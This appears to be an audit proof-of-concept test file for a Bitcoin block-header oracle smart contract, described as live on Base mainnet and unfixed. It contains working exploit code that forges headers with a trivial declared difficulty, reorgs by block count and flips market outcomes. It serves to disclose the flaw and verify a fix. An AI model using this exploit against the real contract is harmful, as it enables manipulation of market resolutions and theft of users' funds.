// PENTEST · ORC-001 (CRITICAL) — a header's own nBits is never validated, PoW is checked
// against the PARENT's self-declared target, and fork choice counts blocks, not work
// ----------------------------------------------------------------------------
// STATUS: NOT YET FIXED — every `DEMONSTRATES` test below asserts today's defective
// behaviour and must be flipped to `ATTACK BLOCKED` by the fix commit.
//
// Attack scenario
//
//   1. Mine ONE header H1 on the oracle's current tip. H1's hash must beat the tip's
//      real target (one Bitcoin block of work), but H1 DECLARES nBits = 0x2100ffff,
//      a target of ~2^256·(1 − 2^-16).
//   2. Every later header H2…Hn is checked against its parent's declared target, so it
//      passes with the first nonce tried. The attacker picks each header's nBits and
//      timestamp freely: difficulty at height T is whatever H_T declares.
//   3. `submitBatchBlocks([H1..Hn])` from any EOA. Every question settling up to the
//      tip resolves irreversibly on forged data. Once the attacker is ≥ as long as the
//      honest chain it loses `NewChainNotLonger`; at ≥ 17 headers past the fork the
//      honest chain cannot even find its fork point (`CannotFindForkPoint`).
//
// Root cause
//
//   - contracts/libraries/BlockHeaderUtils.sol:21-28 — `isValidBlockHeaderHash(prev, next)`
//     returns `uint256(next.blockHash) < calculateDifficultyTarget(prev)`: the PARENT's
//     target. `next.nBits` is stored unchecked (:25 reads `currentBlockHeader`).
//   - contracts/facets/DoefinV1BlockHeaderOracleFacet.sol:248-263 — `_verifyBlockHeader`
//     never checks nBits continuity or the 2016-block retarget ("rule 5", documented at
//     :33-34 and :52, never implemented).
//   - DoefinV1BlockHeaderOracleFacet.sol:131-133 — `NewChainNotLonger` compares block
//     counts, not cumulative work.
//   - Consumer of the forged data: LibOracleAdapter.sol:446-449 (`_getBlockDifficulty`
//     → BlockHeaderUtils.calculateDifficulty on the header's own nBits).
//
// Impact
//
//   About one Bitcoin block of work (~3.1–3.2 BTC at today's difficulty) buys every
//   market resolution and permanent control of the oracle. Permissionless, live on
//   Base mainnet.
//
// How this file proves it (no mocks, no storage writes)
//
//   - The honest chain is REAL Bitcoin: mainnet headers 42312–42350 (Feb 2010) across the
//     retarget at 42336 (nBits 0x1c654657 → 0x1c43b3e5, contract integer difficulty
//     2 → 3). Only real data gives an honest integer difficulty ≥ 2, which a
//     DifficultyThreshold question needs to resolve YES: difficulty ≥ 1 needs a target
//     ≤ 2^224, i.e. ≥ 2^32 hashes per header, so no synthetic chain mined in a test can
//     reach it. The question targets 42336, the first block of the next epoch, so it is
//     also valid under the epoch rule proposed for ORC-006.
//   - H1 (test/data/orc001_real_pow_2010/attacker-h1.json) is a child of real block
//     42328 that carries ONE genuine block of proof-of-work at difficulty 2.53 (expected
//     1.09e10 double-SHA256, ~40 s on a 16-core laptop with mine-h1.c) and declares
//     nBits 0x2100ffff. The contract re-derives its hash and re-checks its PoW on every
//     run. This is the review's attack, scaled down only in the difficulty.
//   - Caveat for the fix: the end-to-end CONTROL creates a market on 2010 headers, so a
//     market-creation freshness check (ORC-006) would reject it; such a check needs a
//     test escape hatch (e.g. staleness 0 = disabled).
//   - H2…Hn are mined in JS at test time; each needs ~1 try.
//   - (b) uses a synthetic regtest-style chain (test/utils/syntheticChain.js).

const path = require("path");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const sc = require("../utils/syntheticChain.js");
const { isolateChainState } = require("../utils/oracleAuditFixture.js");
const {
  snapshotFixture,
  deployOracleAuditDiamond,
  initSyntheticOracle,
  createThreshold,
  payouts,
  submitEach,
  submitBatch,
  loadRealHeaders,
} = require("../utils/oracleAuditFixture.js");

const REAL = loadRealHeaders(path.join(__dirname, "../data/orc001_real_pow_2010/blocks-42312-42350.json"));
const H1_FIXTURE = require("../data/orc001_real_pow_2010/attacker-h1.json");
const H1 = H1_FIXTURE.header;

const INIT_FROM = 42312;
const TIP = 42328; // last header of the initial buffer = H1's parent
const LAST = 42350; // last real header in the fixture
const REAL_NBITS = 0x1c654657; // epoch 40320..42335, contract integer difficulty 2
const NEXT_NBITS = 0x1c43b3e5; // epoch from 42336, contract integer difficulty 3
const TARGET_HEIGHT = 42336; // first block of the next epoch
const THRESHOLD = 2; // YES ⇔ integer difficulty > 2: true on the real chain (3), false before the retarget (2)
const SETTLEMENT_HEIGHT = TARGET_HEIGHT + sc.SETTLEMENT_DELAY; // 42342

const BLOCK_REORGED_TOPIC = ethers.utils.id("BlockReorged(bytes32)");

/** Attacker branch: H1 followed by `extra` free headers declaring the attack nBits. Records nonce tries. */
function attackerBranch(extra) {
  const out = [H1];
  const tries = [];
  let prev = H1;
  for (let i = 0; i < extra; i++) {
    const fields = {
      prevBlockHash: prev.blockHash,
      merkleRootHash: sc.merkleFor("orc001-attacker", prev.blockNumber + 1),
      blockNumber: prev.blockNumber + 1,
      version: 1,
      timestamp: prev.timestamp + 600,
      nBits: sc.NBITS.ATTACK,
    };
    // The oracle's rule: hash < target(parent.nBits). Nothing else is required.
    const { header, tries: t } = sc.mine(fields, (h) => h < sc.contractTarget(prev.nBits));
    out.push(header);
    tries.push(t);
    prev = header;
  }
  return { headers: out, tries };
}

const loadReal2010 = snapshotFixture(async () => {
  const ctx = await deployOracleAuditDiamond();
  await (await ctx.oracle.initializeBlockHeaderOracle(REAL.headers(INIT_FROM, TIP), INIT_FROM)).wait();
  return ctx;
});

describe("PENTEST · ORC-001 (CRITICAL) — nBits never validated; PoW vs parent target; fork choice by block count", function () {
  this.timeout(300_000);
  isolateChainState();

  describe("fixture sanity", function () {
    it("real headers 42312..42350 link and retarget at 42336 (integer difficulty 2 → 3); H1 carries one real block of work while declaring 0x2100ffff", function () {
      for (let h = INIT_FROM + 1; h <= LAST; h++) {
        expect(REAL.byHeight[h].prevBlockHash).to.equal(REAL.byHeight[h - 1].blockHash);
        expect(REAL.byHeight[h].nBits).to.equal(h < TARGET_HEIGHT ? REAL_NBITS : NEXT_NBITS);
      }
      expect(TARGET_HEIGHT % sc.EPOCH_LENGTH).to.equal(0);
      expect(sc.contractDifficulty(REAL_NBITS)).to.equal(2n);
      expect(sc.contractDifficulty(NEXT_NBITS)).to.equal(3n);
      expect(sc.epochOf(TIP + 1)).to.be.lessThan(sc.epochOf(TARGET_HEIGHT)); // undecided at creation (ORC-006 rule)

      // H1 links to real block 42328 and its (re-derived) hash beats 42328's real target.
      expect(sc.blockHash(H1)).to.equal(H1.blockHash);
      expect(H1.prevBlockHash).to.equal(REAL.byHeight[TIP].blockHash);
      expect(sc.hashToBigInt(H1.blockHash) < sc.contractTarget(REAL_NBITS)).to.equal(true);
      // ...and it is a mid-epoch header declaring a different, far easier nBits.
      expect(H1.blockNumber % sc.EPOCH_LENGTH).to.not.equal(0);
      expect(H1.nBits).to.equal(sc.NBITS.ATTACK);
      expect(sc.contractDifficulty(H1.nBits)).to.equal(0n);
      // On Bitcoin H1 is invalid twice over: wrong nBits for its height, and a target above powLimit.
      expect(sc.bitcoinDecodeCompact(H1.nBits).valid).to.equal(false);
    });
  });

  it("CONTROL — the real canonical chain 42329..42342 is accepted and a DifficultyThreshold(>2 @ 42336) resolves YES", async function () {
    const ctx = await loadReal2010();
    const { conditionId } = await createThreshold(ctx, THRESHOLD, TARGET_HEIGHT);

    await submitEach(ctx, REAL.headers(TIP + 1, SETTLEMENT_HEIGHT));

    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(SETTLEMENT_HEIGHT);
    expect((await ctx.oracle.getLatestBlockHeader()).blockHash).to.equal(REAL.byHeight[SETTLEMENT_HEIGHT].blockHash);
    expect(await payouts(ctx, conditionId)).to.deep.equal([0, 1]); // YES: real difficulty 3 > 2
  });

  it("DEMONSTRATES (a) — a mid-epoch header (42329) declaring nBits 0x2100ffff (parent: 0x1c654657) is accepted", async function () {
    const ctx = await loadReal2010();

    await ctx.oracle.submitNextBlock(H1);

    const latest = await ctx.oracle.getLatestBlockHeader();
    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP + 1);
    expect(latest.blockHash).to.equal(H1.blockHash);
    expect(latest.nBits).to.equal(sc.NBITS.ATTACK); // stored unchecked; becomes the target for the next header
    expect((await ctx.oracle.getBlockHeaderByNumber(TIP)).nBits).to.equal(REAL_NBITS);
  });

  it("DEMONSTRATES (a) — after H1 every header is free: 19 more headers, each found within 2 nonce tries, are accepted", async function () {
    const ctx = await loadReal2010();
    const { headers, tries } = attackerBranch(19);

    // Deterministic for the committed H1: no header needed more than 2 tries (p(fail) = 2^-16 per try).
    expect(Math.max(...tries)).to.be.at.most(2);

    await submitBatch(ctx, headers);

    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP + 20);
    expect((await ctx.oracle.getLatestBlockHeader()).blockHash).to.equal(headers[19].blockHash);
  });

  it("DEMONSTRATES (b) — a header whose hash is ABOVE its own declared target (but below its parent's) is accepted", async function () {
    const ctx = await deployOracleAuditDiamond();
    // Put the child on a retarget boundary so a changed nBits is legitimate in principle
    // (and inside Bitcoin's 4x clamp: it declares a 2x harder target). Only the PoW is wrong.
    const boundary = sc.EPOCH_LENGTH * 500; // 1,008,000
    const init = await initSyntheticOracle(ctx, { startHeight: boundary - sc.NUM_OF_BLOCK_HEADERS });
    const parent = init[init.length - 1];
    const parentTarget = sc.contractTarget(parent.nBits);
    const ownTarget = sc.contractTarget(sc.NBITS.REGTEST_HALF);

    const child = sc.nextHeader(parent, {
      nBits: sc.NBITS.REGTEST_HALF,
      tag: "orc001-b",
      accept: (h) => h >= ownTarget && h < parentTarget,
    });
    expect(child.blockNumber % sc.EPOCH_LENGTH).to.equal(0);
    expect(sc.hashToBigInt(child.blockHash) > ownTarget).to.equal(true); // invalid on Bitcoin: insufficient work for what it declares
    expect(sc.passesBitcoinPow(child, sc.POW_LIMIT.REGTEST)).to.equal(false);

    await ctx.oracle.submitNextBlock(sc.toContract(child));

    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(boundary);
    expect((await ctx.oracle.getLatestBlockHeader()).blockHash).to.equal(child.blockHash);
  });

  it("DEMONSTRATES (c) — a branch with LESS cumulative work but MORE blocks replaces the real chain (reorg by block count)", async function () {
    const ctx = await loadReal2010();
    const honest = REAL.headers(TIP + 1, TIP + 3); // 3 real blocks on top of the fork point 42328
    await submitEach(ctx, honest);
    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP + 3);

    const { headers: attack } = attackerBranch(3); // H1..H4, fork at 42328

    // Bitcoin chain-work (GetBlockProof over each block's own nBits).
    const honestWork = honest.reduce((s, h) => s + sc.blockWork(h.nBits), 0n);
    const attackDeclaredWork = attack.reduce((s, h) => s + sc.blockWork(h.nBits), 0n);
    // Even crediting H1 with the real block of work it actually carries:
    const attackSpentWork = sc.blockWork(REAL_NBITS) + attack.slice(1).reduce((s, h) => s + sc.blockWork(h.nBits), 0n);
    expect(attackDeclaredWork).to.equal(4n); // ~1 hash per header
    expect(honestWork > 2n * attackSpentWork).to.equal(true); // the honest branch carries ~3x the work

    const receipt = await submitBatch(ctx, attack);

    expect(receipt.logs.filter((l) => l.topics[0] === BLOCK_REORGED_TOPIC).length).to.equal(1);
    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP + 4);
    for (let i = 0; i < attack.length; i++) {
      expect((await ctx.oracle.getBlockHeaderByNumber(TIP + 1 + i)).blockHash).to.equal(attack[i].blockHash);
    }
  });

  describe("(d) end-to-end — the attacker chooses a DifficultyThreshold outcome through the nBits it declares", function () {
    it("DEMONSTRATES — honest answer YES (real difficulty 3 > 2, see CONTROL) resolves NO after H1..H14 because H_T declares 0x2100ffff (difficulty 0)", async function () {
      const ctx = await loadReal2010();
      const { conditionId } = await createThreshold(ctx, THRESHOLD, TARGET_HEIGHT);
      const { headers: attack } = attackerBranch(SETTLEMENT_HEIGHT - TIP - 1); // H1..H14 → heights 42329..42342

      // The honest answer at T is YES; the header the attacker places at T says difficulty 0.
      expect(sc.contractDifficulty(REAL.byHeight[TARGET_HEIGHT].nBits) > BigInt(THRESHOLD)).to.equal(true);
      const forgedT = attack[TARGET_HEIGHT - TIP - 1];
      expect(forgedT.blockNumber).to.equal(TARGET_HEIGHT);
      expect(sc.contractDifficulty(forgedT.nBits)).to.equal(0n);

      await submitBatch(ctx, attack, { caller: ctx.signers.attacker });

      expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(SETTLEMENT_HEIGHT);
      expect(await payouts(ctx, conditionId)).to.deep.equal([1, 0]); // NO — forged, irreversible
      expect(await ctx.oracleAdapter.getTotalQuestionsResolved()).to.equal(1);
      expect((await ctx.oracleAdapter.getThresholdQuestionsAtBlock(SETTLEMENT_HEIGHT)).length).to.equal(0);
    });

    it("DEMONSTRATES — lock-out 1: the real canonical chain of the same length is rejected NewChainNotLonger", async function () {
      const ctx = await loadReal2010();
      const { headers: attack } = attackerBranch(SETTLEMENT_HEIGHT - TIP - 1);
      await submitBatch(ctx, attack, { caller: ctx.signers.attacker });

      await expect(ctx.oracle.submitBatchBlocks(REAL.headers(TIP + 1, SETTLEMENT_HEIGHT))).to.be.revertedWith(
        "BlockHeaderOracle_NewChainNotLonger()"
      );
      expect((await ctx.oracle.getLatestBlockHeader()).blockHash).to.equal(attack[attack.length - 1].blockHash);
    });

    it("DEMONSTRATES — lock-out 2: with 17 attacker headers past the fork, the real chain cannot find its fork point", async function () {
      const ctx = await loadReal2010();
      const { headers: attack } = attackerBranch(sc.NUM_OF_BLOCK_HEADERS - 1); // H1..H17 → 42329..42345
      await submitBatch(ctx, attack, { caller: ctx.signers.attacker });
      expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP + 17);

      // Longer real chain 42329..42350 (22 blocks): its parent 42328 has left the 17-slot buffer.
      await expect(ctx.oracle.submitBatchBlocks(REAL.headers(TIP + 1, LAST))).to.be.revertedWith(
        "BlockHeaderOracle_CannotFindForkPoint()"
      );
      // ...and the next real header cannot link onto the forged tip.
      await expect(ctx.oracle.submitNextBlock(REAL.byHeight[TIP + 18])).to.be.revertedWith(
        "BlockHeaderOracle_PrevBlockHashMismatch()"
      );
    });
  });
});
